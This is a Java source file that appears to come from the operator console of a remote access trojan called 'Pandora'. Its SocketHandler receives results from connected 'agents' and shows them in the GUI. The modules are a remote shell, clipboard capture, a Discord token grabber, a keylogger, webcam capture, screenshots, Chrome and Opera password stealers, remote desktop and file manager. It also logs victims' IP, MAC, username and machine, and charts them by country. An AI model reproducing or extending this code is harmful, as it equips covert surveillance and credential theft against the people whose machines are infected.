package org.pandora.master.socket;

import javafx.application.Platform;
import javafx.collections.ObservableList;
import javafx.scene.chart.PieChart;
import javafx.scene.control.Label;
import javafx.scene.input.MouseButton;
import javafx.scene.input.MouseEvent;
import lombok.Getter;
import lombok.Setter;
import org.pandora.master.Master;
import org.pandora.master.builder.impl.scene.ControllerBuilder;
import org.pandora.master.data.agent.AgentData;
import org.pandora.master.data.agent.AgentManager;
import org.pandora.master.runnable.ExecutorRunnable;
import org.pandora.master.scene.SceneManager;
import org.pandora.master.scene.SceneType;
import org.pandora.master.scene.impl.agent.Process;
import org.pandora.master.scene.impl.agent.*;
import org.pandora.master.scene.impl.menu.AgentsUI;
import org.pandora.master.scene.impl.menu.HomeUI;
import org.pandora.master.stage.StageManager;
import org.pandora.master.utils.FileUtils;
import org.pandora.master.utils.Notification;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicInteger;

public class SocketHandler {

    private final Master master;
    @Getter
    private final SceneManager sceneManager;
    private final AgentManager agentManager;
    @Getter
    @Setter
    private boolean connected;
    private final ExecutorRunnable executorRunnable;
    private final HomeUI homeUI;
    private final AgentsUI agentsUI;
    private final Notification notification;
    private final StageManager stageManager;
    private final ObservableList<PieChart.Data> pieChartData;
    private final Label chartValue;
    private final FileUtils fileUtils;

    public SocketHandler(final Master master) {
        this.master = master;
        this.connected = false;
        this.executorRunnable = master.getExecutorRunnable();
        this.sceneManager = master.getSceneManager();
        this.agentManager = master.getAgentManager();
        this.notification = master.getNotification();
        this.stageManager = master.getStageManager();
        this.fileUtils = master.getFileUtils();
        this.homeUI = this.sceneManager.getHomeUI();
        this.agentsUI = this.sceneManager.getAgentsUI();
        this.pieChartData = this.homeUI.getPieChartData();
        this.chartValue = this.homeUI.getChartValue();
    }

    public void disconnected(final String reason) {
        this.setConnected(false);
        this.setConnectionInfo(false);
        Platform.runLater(() -> {
            this.homeUI.addConsoleLine("Disconnected from the server - " + reason);
            this.homeUI.addConsoleLine("Trying to connect again..");
            this.pieChartData.clear();
            this.master.agentData.clear();
            this.agentsUI.updateList(false);
            this.homeUI.getCountryNumber().setText("0");
            this.homeUI.getAgentNumber().setText("0");
            this.homeUI.getMasterNumber().setText("0");
        });
    }

    public void connected(final boolean setVar) {
        if (setVar) this.setConnected(true);
        else if (!this.userSeemsConnected()) {
            Platform.runLater(() -> this.homeUI.addConsoleLine("Successfully connected to the server"));
            this.setConnectionInfo(true);
        }
    }

    private boolean userSeemsConnected() {
        return this.homeUI.getBasicBuilder().getConnection().getText().equals("Connected");
    }

    private void setConnectionInfo(final boolean connected) {
        Platform.runLater(() -> this.getSceneManager().getConnectionInfo().stream().filter(node -> node instanceof Label).forEach(node -> ((Label) node).setText(connected ? "Connected" : "Disconnected")));
    }

    public void readFromAgent(final String decoded) {
        final String[] split = decoded.split(":");
        final String module = split[0];
        Platform.runLater(() -> {
            switch (module) {
                case "shell": {
                    this.stageManager.getControllers().keySet().forEach(controller -> {
                        final Object object = this.stageManager.getScenes().get(controller);
                        if (controller.getSceneType() == SceneType.SHELL && object instanceof Shell)
                            ((Shell) object).receiveRequest(split[1], split[2]);
                    });
                    break;
                }
                case "clipboard": {
                    this.stageManager.getControllers().keySet().forEach(controller -> {
                        final Object object = this.stageManager.getScenes().get(controller);
                        if (controller.getSceneType() == SceneType.CLIPBOARD && object instanceof Clipboard)
                            ((Clipboard) object).receiveRequest(split[1], split[2]);
                    });
                    break;
                }
                case "discordGrabber": {
                    this.stageManager.getControllers().keySet().forEach(controller -> {
                        final Object object = this.stageManager.getScenes().get(controller);
                        if (controller.getSceneType() == SceneType.DISCORDGRABBER && object instanceof DiscordGrabber)
                            try {
                                ((DiscordGrabber) object).receiveRequest(split[1], split[2]);
                            } catch (final ArrayIndexOutOfBoundsException ignore) {
                                ((DiscordGrabber) object).receiveRequest(split[1], "No result found.");
                            }
                    });
                    break;
                }
                case "keylogger": {
                    this.stageManager.getControllers().keySet().forEach(controller -> {
                        final Object object = this.stageManager.getScenes().get(controller);
                        if (controller.getSceneType() == SceneType.KEYLOGGER && object instanceof Keylogger)
                            ((Keylogger) object).receiveRequest(split[1]);
                    });
                    break;
                }
                case "webcam": {
                    this.stageManager.getControllers().keySet().forEach(controller -> {
                        final Object object = this.stageManager.getScenes().get(controller);
                        if (controller.getSceneType() == SceneType.WEBCAM && object instanceof Webcam)
                            ((Webcam) object).receiveRequest(split[1], split[2]);
                    });
                    break;
                }
                case "screenshot": {
                    this.stageManager.getScreenshots().keySet().forEach(id -> this.stageManager.getScreenshots().get(id).receiveRequest(split[1], split[2]));
                    break;
                }
                case "processManager": {
                    if (split[1].equals("list")) {
                        this.stageManager.getControllers().keySet().forEach(controller -> {
                            final Object object = this.stageManager.getScenes().get(controller);
                            if (controller.getSceneType() == SceneType.PROCESSMANAGER && object instanceof Process)
                                ((Process) object).receiveRequest(split[2], decoded.replace(split[0] + ":" + split[1] + ":" + split[2] + ":", ""));
                        });
                    }
                    break;
                }
                case "chromeStealer": {
                    this.stageManager.getControllers().keySet().forEach(controller -> {
                        final Object object = this.stageManager.getScenes().get(controller);
                        if (controller.getSceneType() == SceneType.CHROMEGRABBER && object instanceof ChromeStealer)
                            ((ChromeStealer) object).receiveRequest(split[1], split[2]);
                    });
                    break;
                }
                case "operaStealer": {
                    this.stageManager.getControllers().keySet().forEach(controller -> {
                        final Object object = this.stageManager.getScenes().get(controller);
                        if (controller.getSceneType() == SceneType.OPERAGRABBER && object instanceof OperaStealer)
                            ((OperaStealer) object).receiveRequest(split[1], split[2]);
                    });
                    break;
                }
                case "desktop": {
                    this.stageManager.getControllers().keySet().forEach(controller -> {
                        final Object object = this.stageManager.getScenes().get(controller);
                        if (controller.getSceneType() == SceneType.DESKTOP && object instanceof Desktop)
                            ((Desktop) object).receiveRequest(split[1], split[2], decoded.replace(split[0] + ":" + split[1] + ":" + split[2] + ":", ""));
                    });
                    break;
                }
                case "fileManager": {
                    this.stageManager.getControllers().keySet().forEach(controller -> {
                        final Object object = this.stageManager.getScenes().get(controller);
                        if (controller.getSceneType() == SceneType.FILEMANAGER && object instanceof FileManager) {
                            switch (split[1]) {
                                case "list": {
                                    ((FileManager) object).receiveRequest(split[1], split[2], null, decoded.replace(split[0] + ":" + split[1] + ":" + split[2] + ":", ""), null);
                                    break;
                                }
                                case "delete": {
                                    ((FileManager) object).receiveRequest(split[1], split[2], split[3], split[4], null);
                                    break;
                                }
                                case "download": {
                                    ((FileManager) object).receiveRequest(split[1], split[2], null, split[3], split[4]);
                                    break;
                                }
                            }
                        }
                    });
                    break;
                }
            }
        });
    }

    public void readFromServer(final String decoded) {
        Platform.runLater(() -> {
            if (decoded.startsWith("updateDashboard")) {
                final String[] split = decoded.replace("updateDashboard:", "").split(":");
                this.connected(false);
                this.homeUI.getAgentNumber().setText(split[0]);
                this.homeUI.getMasterNumber().setText(split[1]);
                this.homeUI.getCountryNumber().setText(this.getAndRefreshCountries());
            } else if (decoded.startsWith("addAgent")) {
                final String[] splitData = decoded.split(":");
                if (this.master.getAgentManager().getAgentData(splitData[3]) == null) {
                    this.master.agentData.add(new AgentData(splitData[1] /*ADDRESS*/, splitData[2] /*PORT*/, splitData[3] /*ID*/, splitData[4] /*MODE*/, splitData[5] /*MAC*/, splitData[6] /*OS*/, splitData[7] /*USER*/, splitData[8] /*COMPUTER*/, splitData[9] /*LANG*/, splitData[10] /*AGENT VERSION*/));
                    if (this.executorRunnable.requests++ <= 25) {
                        if (Boolean.parseBoolean(this.fileUtils.getValue("clientLogs")))
                            this.homeUI.addConsoleLine(splitData[7] + "@" + splitData[1] + " has been connected to the server! (v" + splitData[10] + ")");
                        this.agentsUI.updateList(true);
                        this.notification.tryToNotify("A new agent is now online", splitData[7] + "@" + splitData[8] + " has been connected from " + splitData[1] + ":" + splitData[2]);
                    }
                }
            } else if (decoded.startsWith("removeAgent")) {
                final AgentData agentData = this.agentManager.getAgentData(decoded.split(":")[1]);
                if (agentData == null) return;
                this.close(agentData.getId(), true);
                this.agentManager.delete(agentData.getId());
                if (Boolean.parseBoolean(this.fileUtils.getValue("clientLogs")))
                    this.homeUI.addConsoleLine(agentData.getUser() + "@" + agentData.getAddress() + " has been disconnected from the server!");
                this.agentsUI.updateList(true);
                this.notification.tryToNotify("A new agent is no longer online", agentData.getUser() + "@" + agentData.getComputer() + " has been disconnected from " + agentData.getAddress() + ":" + agentData.getPort());
            }
        });
    }

    private String getAndRefreshCountries() {
        final HashMap<String, Integer> countries = new HashMap<>();
        final AtomicInteger atomicInteger = new AtomicInteger();
        this.master.agentData.forEach(agentData -> {
            atomicInteger.incrementAndGet();
            countries.put(agentData.getLang(), countries.getOrDefault(agentData.getLang(), 0) + 1);
        });
        this.pieChartData.clear();
        final List<String> sorted = new ArrayList<>(countries.keySet());
        sorted.sort((s1, s2) -> countries.get(s2).compareTo(countries.get(s1)));
        for (int i = 0; i < countries.size(); i++) {
            if (i > 9)
                break;
            this.pieChartData.add(new PieChart.Data(sorted.get(i), countries.get(sorted.get(i))));
        }
        this.homeUI.getCountriesChart().getData().forEach(data -> data.getNode().addEventHandler(MouseEvent.MOUSE_PRESSED, event -> {
            if(event.getButton() == MouseButton.PRIMARY) {
                this.chartValue.setTranslateX(event.getSceneX());
                this.chartValue.setTranslateY(event.getSceneY());
                this.chartValue.setText(data.getName() + " (" + String.format("%2.02f", ((float) countries.get(data.getName())) / atomicInteger.get() * 100) + "%)");
            } else this.chartValue.setText("");
        }));
        if (countries.size() == 0 || atomicInteger.get() == 0) this.chartValue.setText("");
        return String.valueOf(countries.size());
    }

    public void close(final String identifier, final boolean fromAgent) {
        Platform.runLater(() -> {
            final ConcurrentHashMap<ControllerBuilder, String> stages = this.master.getStageManager().getControllers();
            if (fromAgent && identifier != null) {
                stages.keySet().forEach(stage -> {
                    if (stages.get(stage).equals(identifier)) {
                        stage.getStage().close();
                    }
                });
            } else stages.keySet().forEach(stage -> stage.getStage().close());
        });
    }
}
